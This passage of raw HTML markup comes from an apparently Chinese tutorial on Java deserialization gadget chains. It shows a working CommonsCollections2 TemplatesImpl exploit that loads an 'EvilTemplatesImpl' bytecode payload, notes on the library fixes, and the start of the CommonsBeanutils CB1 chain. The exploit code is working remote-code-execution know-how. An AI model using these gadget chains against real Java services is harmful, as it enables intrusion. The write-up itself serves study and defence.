&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="templatesimpl">TemplatesImpl&lt;/h3>
&lt;p>把exp改造为TemplatesImpl的无transformer数组版&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.comparators.TransformingComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Comparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections2TemplatesImpl&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getBytescode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">clazz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">clazz&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">getBytescode&lt;/span>&lt;span style="color:#f92672">()});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;toString&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Comparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PriorityQueue&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="修复">修复&lt;/h3>
&lt;p>这条CC2是cc4限定，因为&lt;code>org.apache.commons.collections4.comparators.TransformingComparator&lt;/code>在之前版本是没有&lt;code>Serializable&lt;/code>接口的，无法在序列化中使用&lt;/p>
&lt;p>在cc3.2.2版中通过添加&lt;code>FunctorUtils#checkUnsafeSerialization&lt;/code>来检测反序列化是否安全，如果没有设置&lt;code>org.apache.commons.collections.enableUnsafeSerialization=true&lt;/code>，会抛出异常&lt;/p>
&lt;p>这个检查在常见的危险Transformer类（Instantiate, Invoker, Prototype, CloneTransformer）里的readObject调用&lt;/p>
&lt;p>在cc4.1版中，这几个类没有Serializable接口，彻底无法序列化了&lt;/p>
&lt;h2 id="cb1">CB1&lt;/h2>
&lt;p>Commons Beanutils，顾名思义封装了对java bean的一些操作方法，比如可以直接调用java bean的getter方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Cat&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里会自动找到name属性的方法，即getName，除此之外这个方法还支持递归获取属性&lt;/p>
&lt;p>在上面的CC2中我们使用了PriorityQueue，在它的排序中涉及到Comparator接口的compare方法，最后触发transform，在CB中也存在一个可利用的Comparator对象，BeanComparator&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">compare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">T&lt;/span> &lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">T&lt;/span> &lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PropertyUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">property&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">internalCompare&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IllegalAccessException&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;IllegalAccessException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationTargetException&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;InvocationTargetException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchMethodException&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;NoSuchMethodException: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
